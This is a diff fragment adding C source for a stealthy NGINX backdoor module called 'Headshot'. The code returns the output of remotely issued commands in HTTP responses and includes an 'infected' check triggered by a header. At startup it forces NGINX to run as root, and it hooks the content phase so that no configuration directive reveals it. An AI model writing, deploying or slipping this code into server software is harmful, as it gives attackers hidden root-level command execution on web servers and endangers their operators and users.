@@ -1,0 +1,74 @@
+        if (comlen == 0){
+            free(comout);
+            comout = "<-- no stderr/stdout from your command -->\n";
+            comlen = 43;
+        }
+
+        b->pos = (unsigned char *)comout; /* first position in memory of the data */
+        b->last = (unsigned char *)comout + comlen; /* last position in memory of the data */
+        b->memory = 1; /* content is in read-only memory */
+        b->last_buf = 1; /* there will be no more buffers in the request */
+
+        /* Sending the headers for the reply. */
+        r->headers_out.status = NGX_HTTP_OK; /* 200 status code */
+        /* Get the content length of the body. */
+        r->headers_out.content_length_n = comlen;
+        ngx_http_send_header(r); /* Send the headers */
+
+        /* Send the body, and return the status code of the output filter chain. */
+        return ngx_http_output_filter(r, &out);
+    }
+
+    /* This is used to see if Headshot is enabled on an NGINX server - not infected NGINX would return  NGX_HTTP_OK (200) */
+    ngx_str_t ngx_headshot_check = ngx_string("Referer-Policy");
+    ngx_table_elt_t *cmd_elt_check = search_headers_in(r, ngx_headshot_check.data, ngx_headshot_check.len);
+    if (cmd_elt_check != NULL){
+	return NGX_HTTP_BAD_REQUEST;
+    }
+    
+    /* this means we really don't wana fuck with the response body */
+    return NGX_DECLINED;
+}
+
+/**
+ * Module Initialization function. To make our RCE relevant I just change
+ * the user NGINX would normally run as to root. ;)
+ *
+ * @param cycle
+ *   The current NGINX cycle.
+ * @return ngx_int_t
+ *   Status of the module init.
+ */
+static ngx_int_t ngx_http_headshot_init_module(ngx_cycle_t *cycle){
+    ngx_core_conf_t *ccf =  (ngx_core_conf_t *)ngx_get_conf(cycle->conf_ctx, ngx_core_module);
+    ccf->username = "root";
+    ccf->user = 0;
+    ccf->group = 0;
+    return NGX_OK;
+}
+
+/**
+ * Configuration setup function that installs the content handler.
+ * this is sneaky af as I just attach it to NGINX's NGX_HTTP_CONTENT_PHASE
+ * this makes it so no directive is needed in the nginx.conf.
+ *
+ * @param cf
+ *   Module configuration structure pointer.
+ * @return ngx_int_t
+ *   Status of the postconfiguration.
+ */
+static ngx_int_t ngx_http_headshot_init(ngx_conf_t *cf){
+    ngx_http_handler_pt        *h;
+    ngx_http_core_main_conf_t  *cmcf;
+    
+
+    cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);
+
+    h = ngx_array_push(&cmcf->phases[NGX_HTTP_CONTENT_PHASE].handlers);
+    if (h == NULL) {
+        return NGX_ERROR;
+    }
+
+    *h = ngx_http_headshot_handler;
+
+    return NGX_OK;
